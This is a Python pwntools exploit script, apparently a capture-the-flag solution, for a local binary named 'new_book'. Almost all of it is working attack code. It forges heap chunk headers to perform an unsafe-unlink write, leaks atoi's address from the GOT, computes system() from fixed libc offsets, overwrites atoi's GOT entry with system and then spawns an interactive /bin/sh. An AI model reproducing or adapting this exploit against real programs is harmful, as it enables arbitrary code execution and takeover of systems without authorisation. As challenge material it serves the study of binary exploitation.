from pwn import *

local = True
debug = 0
log = 0

if log: context.log_level = True	
if local: p = process('./new_book')
#if local: p = process('./book')

def walker():
	p.recvuntil('choices!!')
	p.recvuntil('walker:')
	p.sendline('walker')
	p.recvuntil('modules:')
	p.sendline('23')

def add(author, length, feedback):
	p.recvuntil('choice!!')
	p.sendline('2')
	p.recvuntil('author')
	p.sendline(author)
	p.recvuntil('is it?')
	p.sendline(str(length))
	p.sendline(feedback)

def delete(id):
	p.recvuntil('choice!!')
	p.sendline('3')
	p.recvuntil('book?')
	p.sendline(str(id))

def feedback(id, feedback):
	p.recvuntil('choice!!')
	p.sendline('4')
	p.recvuntil('feedback?')
	p.sendline(str(id))
	p.sendline(feedback)

if debug: gdb.attach(p, open('aa'))
add('b', 0x90, "b" * 50) 
add('a', 1, "a" )
feedback_addr = 0x601D60
atoi_got = 0x601CD0
feedback(0,  p64(0) + p64(0x91) + p64(feedback_addr- 0x18) + p64(feedback_addr - 0x10) + 'a' * 0x70 + p64(0x90) + p64(0x90))
delete(1)  
feedback(0,  p64(1) + p64(0x90) + p64(atoi_got ) + p64(atoi_got) + p64(2))
p.recvuntil('choice!!')
p.sendline('4')
p.recvuntil('book0 is ')
atoi_addr = u64(p.recv(6).ljust(8, '\x00'))
print '[*] atoi addr is ', hex(atoi_addr)
'''
$1 = {<text variable, no debug info>} 0x7f7c36f983d0 <__libc_system>
$2 = {void (_IO_FILE *, char *)} 0x7f7c36fcbb10 <setbuf>
'''
system_addr = 0x7f491bba2390 -0x7f491bb93e80 + atoi_addr
print '[*] system addr is ', hex(system_addr)

p.sendline('0')
p.sendline(p64(system_addr))
p.sendline("/bin/sh")
p.interactive()
